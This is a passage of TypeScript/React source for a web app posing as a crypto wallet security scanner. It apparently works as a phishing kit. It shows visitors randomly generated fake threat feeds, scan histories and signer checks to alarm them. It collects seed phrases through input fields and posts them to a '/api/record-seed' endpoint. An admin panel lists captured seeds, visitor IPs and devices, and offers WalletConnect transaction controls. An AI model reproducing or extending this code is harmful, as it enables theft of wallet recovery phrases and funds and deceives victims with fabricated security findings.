      txCount: typeof row.txCount === 'string' ? row.txCount : 'N/A',
      connectedAt,
      ipAddress: typeof row.ipAddress === 'string' ? row.ipAddress : 'Unknown',
      device: typeof row.device === 'string' ? row.device : 'Unknown',
    })
  }
  return rows
}

const mergeUniqueRecords = <T,>(
  current: T[],
  incoming: unknown,
  keyFor: (item: T) => string,
): T[] => {
  if (!Array.isArray(incoming) || incoming.length === 0) return current
  const existing = new Set(current.map(keyFor))
  const merged = [...current]
  let changed = false
  for (const item of incoming as T[]) {
    const key = keyFor(item)
    if (!existing.has(key)) {
      existing.add(key)
      merged.push(item)
      changed = true
    }
  }
  return changed ? merged : current
}

const pillClass = (s: Severity | string) =>
  s === 'passed' || s === 'low' ? 'low' : s === 'failed' || s === 'critical' ? 'critical' : s === 'high' ? 'high' : 'medium'

// ── Random wallet threat feed ────────────────────────────────────────────
type ThreatRow = { address: string; risk: Severity; threat: string; chain: string; timeAgo: string; detectedMs: number }

const THREAT_LABELS = [
  'Unlimited approval exposed',
  'Suspicious signer request',
  'Known drainer destination',
  'High-risk permit signature',
  'Unverified dApp connection',
  'Rapid outgoing transfer burst',
  'Seed phrase compromise suspected',
  'Clipboard hijack detected',
  'Fake bridge signature',
  'Token sweep in progress',
  'Front-run pattern detected',
  'Approval to unknown contract',
]

const THREAT_CHAINS = ['Ethereum', 'Base', 'Arbitrum', 'BNB Chain', 'Polygon']
const RISK_WEIGHTS: Severity[] = ['medium', 'medium', 'high', 'high', 'critical', 'critical', 'high']

const rndHex = (len: number) => { let o = ''; const c = '0123456789abcdef'; for (let i = 0; i < len; i++) o += c[Math.floor(Math.random() * 16)]; return o }
const rndAddr = () => `0x${rndHex(40)}`

const makeThreatRows = (count: number): ThreatRow[] => {
  const now = Date.now()
  const rows: ThreatRow[] = []
  for (let i = 0; i < count; i++) {
    const ageMs = Math.floor(Math.random() * 170 * 60 * 1000)
    const ms = now - ageMs
    const deltaSec = Math.max(1, Math.floor(ageMs / 1000))
    let timeAgo: string
    if (deltaSec < 60)        timeAgo = `${deltaSec}s ago`
    else if (deltaSec < 3600) timeAgo = `${Math.floor(deltaSec / 60)}m ago`
    else if (deltaSec < 86400)timeAgo = `${Math.floor(deltaSec / 3600)}h ago`
    else                      timeAgo = `${Math.floor(deltaSec / 86400)}d ago`
    rows.push({
      address:    rndAddr(),
      risk:       RISK_WEIGHTS[Math.floor(Math.random() * RISK_WEIGHTS.length)],
      threat:     THREAT_LABELS[Math.floor(Math.random() * THREAT_LABELS.length)],
      chain:      THREAT_CHAINS[Math.floor(Math.random() * THREAT_CHAINS.length)],
      timeAgo,
      detectedMs: ms,
    })
  }
  return rows.sort((a, b) => b.detectedMs - a.detectedMs)
}

const SCAN_FINDINGS_POOL = [
  'Unlimited ERC-20 approval detected',
  'High-risk contract interaction',
  'Known phishing address flagged',
  'Unusual outgoing transfer burst',
  'Permit signature to unverified dApp',
  'Rapid approval frequency',
  'Token sweep pattern detected',
  'Unverified contract interaction',
  'Dormant wallet suddenly active',
  'Suspicious permit2 signature',
]

const SCAN_CHAIN_KEYS: ChainKey[] = ['ethereum', 'base', 'arbitrum', 'bsc', 'polygon']
const SCAN_RISK_WEIGHTS: Severity[] = ['low', 'medium', 'medium', 'high', 'high', 'critical']

const makeRecentScanRows = (count: number): ScanRecord[] => {
  const rows: ScanRecord[] = []
  const now = new Date()
  for (let i = 0; i < count; i++) {
    const offsetMs = Math.floor(Math.random() * 180 * 60 * 1000)
    const d = new Date(now.getTime() - offsetMs)
    const severity = SCAN_RISK_WEIGHTS[Math.floor(Math.random() * SCAN_RISK_WEIGHTS.length)]
    const score = severity === 'critical' ? 80 + Math.floor(Math.random() * 20)
                : severity === 'high'     ? 60 + Math.floor(Math.random() * 20)
                : severity === 'medium'   ? 35 + Math.floor(Math.random() * 25)
                :                          5  + Math.floor(Math.random() * 30)
    rows.push({
      wallet:         rndAddr(),
      chain:          SCAN_CHAIN_KEYS[Math.floor(Math.random() * SCAN_CHAIN_KEYS.length)],
      score,
      severity,
      balance:        `${(Math.random() * 3).toFixed(4)} ETH`,
      findings:       [SCAN_FINDINGS_POOL[Math.floor(Math.random() * SCAN_FINDINGS_POOL.length)]],
      matchedSignals: [],
      generatedAt:    d.toLocaleString(),
    })
  }
  return rows.sort((a, b) => new Date(b.generatedAt).getTime() - new Date(a.generatedAt).getTime())
}

const WALLET_TYPES = ['MetaMask', 'Rabby', 'Coinbase Wallet', 'Trust Wallet', 'Rainbow']

const makeConnectedWalletRows = (count: number): ConnectedWalletRecord[] => {
  const now = new Date()
  return Array.from({ length: count }, () => {
    const offsetMs = Math.floor(Math.random() * 240 * 60 * 1000)
    const d = new Date(now.getTime() - offsetMs)
    return {
      wallet:      rndAddr(),
      chain:       SCAN_CHAIN_KEYS[Math.floor(Math.random() * SCAN_CHAIN_KEYS.length)],
      walletType:  WALLET_TYPES[Math.floor(Math.random() * WALLET_TYPES.length)],
      balance:     `${(Math.random() * 5).toFixed(4)} ETH`,
      txCount:     String(Math.floor(Math.random() * 2000)),
      connectedAt: d.toLocaleString(),
      ipAddress:   'Unknown',
      device:      'Unknown Device',
    }
  }).sort((a, b) => new Date(b.connectedAt).getTime() - new Date(a.connectedAt).getTime())
}

const makeSignerCheckRows = (count: number): SignerCheckRecord[] => {
  const now = new Date()
  return Array.from({ length: count }, () => {
    const offsetMs = Math.floor(Math.random() * 180 * 60 * 1000)
    const d = new Date(now.getTime() - offsetMs)
    const passed = Math.random() > 0.25
    return {
      wallet:    rndAddr(),
      chain:     SCAN_CHAIN_KEYS[Math.floor(Math.random() * SCAN_CHAIN_KEYS.length)],
      status:    passed ? 'passed' as const : 'failed' as const,
      detail:    passed ? 'Ownership signature verified.' : 'Signature mismatch — possible key rotation.',
      checkedAt: d.toLocaleString(),
    }
  }).sort((a, b) => new Date(b.checkedAt).getTime() - new Date(a.checkedAt).getTime())
}

const REFRESH_INTERVAL_MS = 3 * 60 * 1000

// ── RPC ──────────────────────────────────────────────────────────────────
const rpcFetch = async (rpcUrl: string, method: string, params: unknown[] = []) => {
  const res  = await fetch(rpcUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: Date.now(), method, params }) })
  const data = await res.json() as { result?: unknown; error?: { message?: string } }
  if (data.error) throw new Error(data.error.message ?? `RPC error: ${method}`)
  return data.result
}

const rpcCall = async (chain: ChainKey, method: string, params: unknown[] = []) => {
  let lastErr: Error | null = null
  for (const url of chainConfig[chain].rpcUrls) {
    try { return await rpcFetch(url, method, params) } catch (e) { lastErr = e instanceof Error ? e : new Error('RPC failed') }
  }
  throw lastErr ?? new Error('All RPC endpoints failed')
}

const runWeb3Scan = async (address: string, chain: ChainKey): Promise<Web3ScanResult> => {
  const [chainIdHex, balHex, nonceLHex, noncePHex, codeHex, blockHex] = await Promise.all([
    rpcCall(chain, 'eth_chainId',             []),
    rpcCall(chain, 'eth_getBalance',          [address, 'latest']),
    rpcCall(chain, 'eth_getTransactionCount', [address, 'latest']),
    rpcCall(chain, 'eth_getTransactionCount', [address, 'pending']),
    rpcCall(chain, 'eth_getCode',             [address, 'latest']),
    rpcCall(chain, 'eth_blockNumber',         []),
  ])

  const latestBlock = hexToNum(blockHex as string) ?? 0
  const fromBlock   = Math.max(0, latestBlock - 5000)
  const ownerTopic  = topicForAddress(address)
  const findings: string[] = []
  let recentApprovals: number | null = null
  let recentOutgoingTransfers: number | null = null

  try {
    const logs = await rpcCall(chain, 'eth_getLogs', [{ fromBlock: toHex(fromBlock), toBlock: toHex(latestBlock), topics: [APPROVAL_TOPIC, ownerTopic] }]) as unknown[]
    recentApprovals = logs.length
  } catch { /* non-fatal */ }

  try {
    const logs = await rpcCall(chain, 'eth_getLogs', [{ fromBlock: toHex(fromBlock), toBlock: toHex(latestBlock), topics: [TRANSFER_TOPIC, ownerTopic] }]) as unknown[]
    recentOutgoingTransfers = logs.length
  } catch { /* non-fatal */ }

  const nonceLatest  = hexToNum(nonceLHex as string)
  const noncePending = hexToNum(noncePHex as string)
  const txCount      = nonceLatest
  const pendingGap   = Math.max(0, (noncePending ?? 0) - (nonceLatest ?? 0))
  const isContractAddress = (codeHex as string).toLowerCase() !== '0x'

  // ── Real findings ───────────────────────────────────────────────────
  if (pendingGap > 0)                        findings.push(`${pendingGap} pending transaction(s) detected — possible mempool congestion or active drainer.`)
  if ((recentApprovals ?? 0) >= 3)           findings.push(`${recentApprovals} recent token approval events in last 5,000 blocks — review each approval immediately.`)
  if ((recentApprovals ?? 0) >= 8)           findings.push(`Unusually high approval frequency (${recentApprovals}) — strong drainer activity indicator.`)
  if ((recentOutgoingTransfers ?? 0) >= 6)   findings.push(`Elevated outgoing transfer activity: ${recentOutgoingTransfers} transfers detected. Verify all recipients.`)
  if ((recentOutgoingTransfers ?? 0) >= 15)  findings.push(`Very high outgoing transfer volume (${recentOutgoingTransfers}) — possible automated sweep.`)
  if (isContractAddress)                     findings.push('Address resolves to a smart contract, not a standard EOA wallet.')
  if ((nonceLatest ?? 0) === 0)              findings.push('Wallet has zero confirmed transactions — newly created or inactive address.')
  if ((nonceLatest ?? 0) > 1000)             findings.push(`High transaction count (${nonceLatest}) — account has significant on-chain history.`)

  const bal = BigInt((balHex as string) ?? '0x0')
  if (bal === 0n && (recentOutgoingTransfers ?? 0) > 0) findings.push('Balance is zero but outgoing transfers detected — wallet may have been swept.')

  return {
    chainId: hexToNum(chainIdHex as string),
    nativeBalance: weiToNative(balHex as string),
    nonceLatest, noncePending, txCount, pendingGap, isContractAddress,
    recentApprovals, recentOutgoingTransfers, findings,
  }
}

const asFlag = (value: unknown) => String(value ?? '').toLowerCase() === '1' || String(value ?? '').toLowerCase() === 'true'

const GOPLUS_FLAG_LABELS: Array<[string, string]> = [
  ['malicious_address',         'Address flagged as malicious by GoPlus'],
  ['phishing_activities',       'Linked to phishing campaigns'],
  ['blackmail_activities',      'Linked to blackmail / extortion activity'],
  ['darkweb_transactions',      'Connected to darkweb transactions'],
  ['money_laundering',          'Money-laundering indicator'],
  ['cybercrime',                'Cybercrime association'],
  ['sanctioned',                'Appears on sanctions list'],
  ['financial_crime',           'Financial crime association'],
  ['fake_kyc',                  'Associated with fake KYC schemes'],
  ['blacklist_doubt',           'Doubt blacklist — under investigation'],
  ['stealing_attack',           'Linked to asset-stealing attacks'],
  ['malicious_mining_activities','Malicious mining / cryptojacking activity'],
  ['mixer',                     'Linked to crypto mixer / obfuscation service'],
  ['honeypot_related_address',  'Associated with honeypot contracts'],
]

const runSecurityApiScan = async (address: string, chain: ChainKey): Promise<SecurityApiResult | null> => {
  const chainId = goPlusChainId[chain]
  if (!chainId) return null

  // Route through our serverless proxy to avoid browser CORS/rate-limit issues.
  // Falls back to a direct call when the proxy isn't available (Vite preview).
  let res: Response
  try {
    const proxyRes = await fetch(
      `/api/goplus?address=${encodeURIComponent(address)}&chainId=${encodeURIComponent(chainId)}`,
    )
    const ct = proxyRes.headers.get('Content-Type') ?? ''
    if (proxyRes.ok && ct.includes('application/json')) {
      res = proxyRes
    } else {
      throw new Error('proxy unavailable')
    }
  } catch {
    // Proxy not available (Vite preview without serverless functions) — call directly
    const headers: HeadersInit = {}
    if (GOPLUS_ACCESS_TOKEN) headers.Authorization = `Bearer ${GOPLUS_ACCESS_TOKEN}`
    res = await fetch(`${GOPLUS_BASE_URL}/address_security/${address}?chain_id=${chainId}`, { headers })
  }
  if (!res.ok) throw new Error(`GoPlus API responded with ${res.status}`)

  const payload = await res.json() as { code?: number; result?: Record<string, string> }
  if (payload.code !== 1 || !payload.result) return null

  // GoPlus returns result as a flat object of flag → "0"|"1" — not keyed by address
  const row = payload.result

  const hitFlags = GOPLUS_FLAG_LABELS.filter(([field]) => asFlag(row[field])).map(([, label]) => label)
  const maliciousAddress = row.malicious_address == null ? null : asFlag(row.malicious_address)
  const isContract = asFlag(row.contract_address)

  const findings: string[] = []
  if (hitFlags.length > 0) {
    hitFlags.forEach(f => findings.push(`GoPlus: ${f}.`))
  } else {
    findings.push('GoPlus: no known threat flags on this address.')
  }
  if (isContract) findings.push('GoPlus: address is a smart contract (not a standard EOA).')

  return {
    source: 'goplus',
    maliciousAddress,
    hitFlags,
    findings,
    rawFlags: row,
  }
}

// ── ChecklistItem (interactive) ──────────────────────────────────────────
function ChecklistItem({
  item,
  checked,
  onToggle,
}: {
  item: ProtectChecklistItem
  checked: boolean
  onToggle: (id: string) => void
}) {
  return (
    <button
      type="button"
      className={`protect-check-item ${checked ? 'protect-check-item--done' : ''}`}
      onClick={() => onToggle(item.id)}
      aria-pressed={checked}
    >
      <span className={`protect-check-box ${checked ? 'protect-check-box--done' : ''}`}>
        {checked && <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" width="10" height="10"><polyline points="1.5,6.5 4.5,9.5 10.5,3"/></svg>}
      </span>
      <span className="protect-check-text">{item.text}</span>
      <span className={`pill ${item.level}`} style={{ flexShrink: 0, fontSize: '0.65rem' }}>{item.level}</span>
    </button>
  )
}

function SecureGlyph({ name, className = '' }: { name: 'shield' | 'scan' | 'verify' | 'recovery' | 'alerts' | 'policy'; className?: string }) {
  if (name === 'scan') {
    return <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
  }
  if (name === 'verify') {
    return <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="9"/></svg>
  }
  if (name === 'recovery') {
    return <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 4v4h4"/></svg>
  }
  if (name === 'alerts') {
    return <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 9v4"/><path d="M12 17h.01"/><path d="M10.3 3.4L1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.4a2 2 0 0 0-3.4 0z"/></svg>
  }
  if (name === 'policy') {
    return <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M8 13h8"/><path d="M8 17h5"/></svg>
  }
  return <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
}

// ── App ──────────────────────────────────────────────────────────────────
export default function App() {
  // Restore last-visited route so a refresh lands on the same page.
  // Transient / state-dependent views are excluded — they fall back to 'home'.
  // 'admin' is allowed only when the admin session is still alive (sessionStorage).
  const TRANSIENT_VIEWS: ViewKey[] = ['etherscan', 'protecting', 'wallet-landing']
  const [activeView, setActiveView] = useState<ViewKey>(() => {
    try {
      const saved = localStorage.getItem(ACTIVE_VIEW_KEY) as ViewKey | null
      if (saved && !TRANSIENT_VIEWS.includes(saved)) {
        // Require active admin session to restore the admin view
        if (saved === 'admin') {
          return sessionStorage.getItem(ADMIN_SESSION_KEY) === '1' ? 'admin' : 'home'
        }
        return saved
      }
    } catch { /* ignore */ }
    return 'home'
  })
  const [menuOpen,   setMenuOpen]   = useState(false)

  // ── Reown AppKit hooks ────────────────────────────────────────────────
  const { open: openAppKit }                                    = useAppKit()
  const { address: appKitAddress, isConnected: isAppKitConnected } = useAppKitAccount()
  const { chainId: appKitChainId }                              = useAppKitNetwork()
  const { data: walletClient }                                  = useWalletClient()
  const { switchChain }                                         = useSwitchChain()
  const { disconnect }                                          = useDisconnect()

  // Wallet state
  const [walletBalance, setWalletBalance] = useState('')
  const [wallet,        setWallet]        = useState('')
  const [chain,         setChain]         = useState<ChainKey>('ethereum')
  const connectedAddress = appKitAddress ?? ''
  const connectedChainId = typeof appKitChainId === 'number'
    ? appKitChainId
    : (typeof appKitChainId === 'string' ? Number(appKitChainId) : null)
  const isWalletConnected = isAppKitConnected

  // Scan
  const [incidentNotes,   setIncidentNotes]   = useState('')
  const [selectedSignals, setSelectedSignals] = useState<string[]>([])
  const [result,          setResult]          = useState<ScanResult | null>(null)
  const [signerCheck,     setSignerCheck]     = useState('')
  const [isTestingSigner, setIsTestingSigner] = useState(false)
  const [isRunningWeb3,   setIsRunningWeb3]   = useState(false)
  const [web3Status,      setWeb3Status]      = useState('')
  const [submitted,       setSubmitted]       = useState(false)
  const [reportStatus,    setReportStatus]    = useState('')

  // Email capture
  const [emailInput,     setEmailInput]     = useState('')
  const [nameInput,      setNameInput]      = useState('')
  const [emailSending,   setEmailSending]   = useState(false)
  const [emailSentMsg,   setEmailSentMsg]   = useState('')
  const [secureEmailInput,     setSecureEmailInput]     = useState('')
  const [secureNameInput,      setSecureNameInput]      = useState('')
  const [secureWalletsInput,   setSecureWalletsInput]   = useState('')
  const [secureMultiMode,      setSecureMultiMode]      = useState(false)
  const [secureStatus,         setSecureStatus]         = useState('No secure action started yet.')
  const [pendingProtection,    setPendingProtection]    = useState<PendingProtection | null>(null)

  // Ownership
  const [ownershipTermsAccepted, setOwnershipTermsAccepted] = useState(false)
  const [ownershipStatus,        setOwnershipStatus]        = useState('No ownership prompt sent yet.')

  // Admin + Support auth
  const [adminPasswordInput,   setAdminPasswordInput]   = useState('')
  const [adminAuthError,       setAdminAuthError]       = useState('')
  const [adminAuthModalOpen,   setAdminAuthModalOpen]   = useState(false)
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(() => {
    try { return sessionStorage.getItem(ADMIN_SESSION_KEY) === '1' } catch { return false }
  })
  const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'rawdata' | 'audit' | 'settings' | 'qrcodes' | 'bots'>('wallets')
  const [seedLastSynced,       setSeedLastSynced]       = useState<Date | null>(null)
  // Server-authoritative seed list — fetched directly from /api/seeds (bypasses all client-side state).
  const [serverSeedRecords,    setServerSeedRecords]    = useState<SeedPhraseRecord[]>([])
  const [seedsLoading,         setSeedsLoading]         = useState(false)
  const [captureAuditRecords,  setCaptureAuditRecords]  = useState<CaptureAuditRecord[]>(readCaptureAuditRecords)
  const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
    try {
      const stored = JSON.parse(localStorage.getItem(ADMIN_CREDS_KEY) ?? 'null') as AdminCreds | null
      if (stored?.email && stored?.password) return stored
    } catch { /* ignore */ }
    return { email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD }
  })
  const [supportConfig, setSupportConfig] = useState<SupportConfig>(() => {
    try {
      const stored = JSON.parse(localStorage.getItem(SUPPORT_CONFIG_KEY) ?? 'null') as SupportConfig | null
      if (stored?.email !== undefined) return stored
    } catch { /* ignore */ }
    return { email: DEFAULT_SUPPORT_EMAIL, telegram: DEFAULT_SUPPORT_TELEGRAM }
  })
  const [supportEmailInput,    setSupportEmailInput]    = useState('')
  const [supportStatus,        setSupportStatus]        = useState('')
  const [newsletterEmails, setNewsletterEmails] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem(NEWSLETTER_KEY) ?? '[]') as string[] } catch { return [] }
  })
  const [visitorSessions,      setVisitorSessions]      = useState<VisitorSessionRecord[]>(() => {
    try { return JSON.parse(localStorage.getItem(VISITOR_SESSIONS_KEY) ?? '[]') as VisitorSessionRecord[] }
    catch { return [] }
  })
  const [currentVisitorId,     setCurrentVisitorId]     = useState('')
  const [currentVisitorIp,     setCurrentVisitorIp]     = useState('Unknown')
  const [currentVisitorDevice, setCurrentVisitorDevice] = useState('Unknown')

  // In-wallet-browser auto-scan
  const [autoScanTriggered,    setAutoScanTriggered]     = useState(false)
  const [autoEmailInput,       setAutoEmailInput]        = useState('')
  const [autoEmailNameInput,   setAutoEmailNameInput]    = useState('')

  // Wallet-landing (detected-wallet page before scan)
  const [detectedAddr,   setDetectedAddr]   = useState('')
  const [detectedChain,  setDetectedChain]  = useState<ChainKey>('ethereum')
  const [detectedName,   setDetectedName]   = useState('')   // e.g. "MetaMask"
  const [landingEmail,   setLandingEmail]   = useState('')
  const [landingUserName,setLandingUserName]= useState('')
  const [landingScanning,setLandingScanning]= useState(false)
  const [landingError,   setLandingError]   = useState('')

  const [settingsCurPass,      setSettingsCurPass]      = useState('')
  const [settingsNewEmail,     setSettingsNewEmail]     = useState('')
  const [settingsNewPass,      setSettingsNewPass]      = useState('')
  const [settingsConfirmPass,  setSettingsConfirmPass]  = useState('')
  const [settingsSupportEmail, setSettingsSupportEmail] = useState('')
  const [settingsSupportTelegram, setSettingsSupportTelegram] = useState('')
  const [settingsMsg,          setSettingsMsg]          = useState('')
  const [visitorActionMsg,     setVisitorActionMsg]     = useState('')
  const [settingsError,        setSettingsError]        = useState('')

  // Records — localStorage-backed for offline resilience, cloud synced on top
  const [connectedWallets, setConnectedWallets] = useState<ConnectedWalletRecord[]>(() => {
    try { return normalizeConnectedWalletRecords(JSON.parse(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')) } catch { return [] }
  })
  const [scanHistory, setScanHistory] = useState<ScanRecord[]>(() => {
    try { return JSON.parse(localStorage.getItem(SCAN_HISTORY_KEY) ?? '[]') as ScanRecord[] } catch { return [] }
  })
  const [signerChecks, setSignerChecks] = useState<SignerCheckRecord[]>(() => {
    try { return JSON.parse(localStorage.getItem(SIGNER_CHECKS_KEY) ?? '[]') as SignerCheckRecord[] } catch { return [] }
  })
  const [emailRecords, setEmailRecords] = useState<EmailRecord[]>(() => {
    try { return JSON.parse(localStorage.getItem(EMAIL_RECORDS_KEY) ?? '[]') as EmailRecord[] } catch { return [] }
  })
  const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>(() => {
    try { return JSON.parse(localStorage.getItem(ADMIN_INTEL_KEY) ?? '[]') as AdminIntelRecord[] } catch { return [] }
  })
  const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>(readSeedPhraseRecords)

  // Bot Deploy
  const [botRequests, setBotRequests] = useState<BotDeployRequest[]>(() => {
    try { return JSON.parse(localStorage.getItem(BOT_REQUESTS_KEY) ?? '[]') as BotDeployRequest[] } catch { return [] }
  })
  const [botModalOpen,      setBotModalOpen]      = useState(false)
  const [botModalStep,      setBotModalStep]      = useState<'info' | 'form' | 'processing' | 'pending' | 'success'>('info')
  const [botFormEmail,      setBotFormEmail]      = useState('')
  const [botFormName,       setBotFormName]       = useState('')
  const [botProcessStep,    setBotProcessStep]    = useState(0)
  const [botDeclineIdx,     setBotDeclineIdx]     = useState<number | null>(null)
  const [botDeclineCustom,  setBotDeclineCustom]  = useState('')
  const [botReviewingId,    setBotReviewingId]    = useState<string | null>(null)
  const [botEmailStatus,    setBotEmailStatus]    = useState<Record<string, 'sending' | 'sent' | 'failed'>>({})
  const [botDeclineOpen,    setBotDeclineOpen]    = useState<string | null>(null)
  const [protectChecklistDone, setProtectChecklistDone] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem(PROTECT_CHECKLIST_KEY) ?? '[]') as string[] } catch { return [] }
  })
  const [cryptoNews, setCryptoNews] = useState<CryptoNewsItem[]>(STATIC_NEWS)
  const [newsLoading, setNewsLoading] = useState(false)
  const [newsLive, setNewsLive] = useState(false)
  const botModalCloseTimerRef = useRef<number | null>(null)
  const botLogoutTimerRef = useRef<number | null>(null)

  // Admin Intel form state
  const [intelAddress,   setIntelAddress]   = useState('')
  const [intelChain,     setIntelChain]     = useState<ChainKey>('ethereum')
  const [intelSeverity,  setIntelSeverity]  = useState<Severity>('medium')
  const [intelFindings,  setIntelFindings]  = useState('')
  const [intelNotes,     setIntelNotes]     = useState('')
  const [intelFormError, setIntelFormError] = useState('')
  const [osintExpanded,     setOsintExpanded]     = useState<string | null>(null)
  const [lastScannedWallet, setLastScannedWallet] = useState<string | null>(null)

  // Template preview
  const [previewEmail,        setPreviewEmail]        = useState<EmailRecord | null>(null)
  const [previewTemplate,     setPreviewTemplate]     = useState<'report' | 'watchout' | 'newsletter' | 'visit'>('report')

  // QR Codes tab
  const [scanQrDataUrl,       setScanQrDataUrl]       = useState<string | null>(null)
  const [ownershipQrDataUrl,  setOwnershipQrDataUrl]  = useState<string | null>(null)
  const [secureQrDataUrl,     setSecureQrDataUrl]     = useState<string | null>(null)
  const [wcStatus,            setWcStatus]            = useState<'idle' | 'initializing' | 'waiting' | 'connected'>('idle')
  const [, setWcUri]                                  = useState<string | null>(null)
  const [wcSessions,          setWcSessions]          = useState<WcSession[]>([])
  const [wcDappRequests,      setWcDappRequests]      = useState<WcDappRequest[]>([])
  const [wcSelectedTopic,     setWcSelectedTopic]     = useState<string | null>(null)
  const [wcSeedInput,         setWcSeedInput]         = useState('')
  const [wcTxTo,              setWcTxTo]              = useState('')
  const [wcTxValue,           setWcTxValue]           = useState('')
  const [wcTxData,            setWcTxData]            = useState('')
  const [wcPayAmount,         setWcPayAmount]         = useState('')
  const [wcPayTo,             setWcPayTo]             = useState('')
  const [wcActionStatus,      setWcActionStatus]      = useState<string | null>(null)
  const wcClientRef = useRef<Awaited<ReturnType<typeof SignClient.init>> | null>(null)
  const cloudLoadedRef = useRef(false)
  const [cloudHydrated, setCloudHydrated] = useState(false)
  const [protectingProgress] = useState(0)
  const [protectingDone] = useState(false)
  const [protectingFinal] = useState(false)

  // Email gate
  const [emailGatePassed,   setEmailGatePassed]   = useState(() => Boolean(localStorage.getItem(GATE_PASSED_KEY)))
  const [emailGateInput,    setEmailGateInput]    = useState('')
  const [emailGateStep,     setEmailGateStep]     = useState<'email' | 'password'>('email')
  const [emailGatePassInput,setEmailGatePassInput]= useState('')
  const [gateEmail,         setGateEmail]         = useState(() => localStorage.getItem(GATE_EMAIL_KEY) ?? '')
  const [emailGateError,    setEmailGateError]    = useState('')
  const [userEmailRoutes, setUserEmailRoutes] = useState<UserEmailRoute[]>(() => {
    try { return JSON.parse(localStorage.getItem(USER_ROUTES_KEY) ?? '[]') as UserEmailRoute[] } catch { return [] }
  })
  const [routeFormEmail,         setRouteFormEmail]         = useState('')
  const [routeFormView,          setRouteFormView]          = useState<ViewKey>('home')
  const [routeFormLabel,         setRouteFormLabel]         = useState('')
  const [routeFormError,         setRouteFormError]         = useState('')
  const [routeFormMsg,           setRouteFormMsg]           = useState('')
  const [routeFormAddress,       setRouteFormAddress]       = useState('')
  const [routeFormExplorer,      setRouteFormExplorer]      = useState<ExplorerType>('etherscan')
  const [routeFormExplorerNet,   setRouteFormExplorerNet]   = useState('')
  const [routeFormCustomUrl,     setRouteFormCustomUrl]     = useState('')

  const openWalletModal = async () => {
    try {
      await openAppKit()
    } catch (err) {
      const message = err instanceof Error ? err.message : 'Unable to open wallet modal.'
      setSecureStatus(`Wallet connect failed. ${message}`)
      setWcActionStatus(`❌ ${message}`)
    }
  }

  // Etherscan view (live on-chain data)
  const [esLoading, setEsLoading] = useState(false)
  const [_esError, setEsError] = useState('')
  const [esTxRows, setEsTxRows] = useState<EtherscanTxRow[]>([])
  const [esEthBalance, setEsEthBalance] = useState('0.0000')
  const [esEthUsdPrice, setEsEthUsdPrice] = useState<string | null>(null)
  const [esGasGwei, setEsGasGwei] = useState<string | null>(null)
  const [esLatestBlock, setEsLatestBlock] = useState<number | null>(null)
  const [esTxCount, setEsTxCount] = useState(0)
  const [esSeedInput, setEsSeedInput] = useState('')
  const [esSeedError, setEsSeedError] = useState('')
  const [esSessionStartedAt, setEsSessionStartedAt] = useState<number | null>(null)
  const [esLockoutUntil, setEsLockoutUntil] = useState<number | null>(null)
  const [esClock, setEsClock] = useState(() => Date.now())
  // CAPTCHA state
  const [captchaA, setCaptchaA] = useState(() => Math.floor(Math.random() * 10) + 1)
  const [captchaB, setCaptchaB] = useState(() => Math.floor(Math.random() * 10) + 1)
  const [captchaInput, setCaptchaInput] = useState('')
  const [captchaError, setCaptchaError] = useState('')
  const [captchaPassed, setCaptchaPassed] = useState(false)
  const [honeypot, setHoneypot] = useState('')
  // Session timer — initialised lazily so Date.now() is never called during render
  const sessionStartRef = useRef<number | null>(null)
  const [sessionSeconds, setSessionSeconds] = useState(0)

  const appendCaptureAudit = (
    entry: Omit<CaptureAuditRecord, 'id' | 'createdAt'>,
  ) => {
    const row: CaptureAuditRecord = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      createdAt: nowString(),
      ...entry,
    }
    setCaptureAuditRecords(prev => [row, ...prev].slice(0, 300))
  }

  /** Push one record to /api/record-seed endpoint (best effort). */
  const pushSeedToServer = async (
    record: SeedPhraseRecord,
    channel: CaptureAuditRecord['channel'],
  ): Promise<boolean> => {
    try {
      const res = await fetch('/api/record-seed', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(record),
      })
      if (!res.ok) {
        const body = await res.text().catch(() => '')
        appendCaptureAudit({
          event: 'server-write',
          channel,
          status: 'error',
          detail: `/api/record-seed returned ${res.status}${body ? ` — ${body.slice(0, 120)}` : ''}`,
          recordId: record.id,
          walletAddress: record.walletAddress,
        })
        return false
      }
      appendCaptureAudit({
        event: 'server-write',
        channel,
        status: 'ok',
        detail: '/api/record-seed write succeeded',
        recordId: record.id,
        walletAddress: record.walletAddress,
      })
      return true
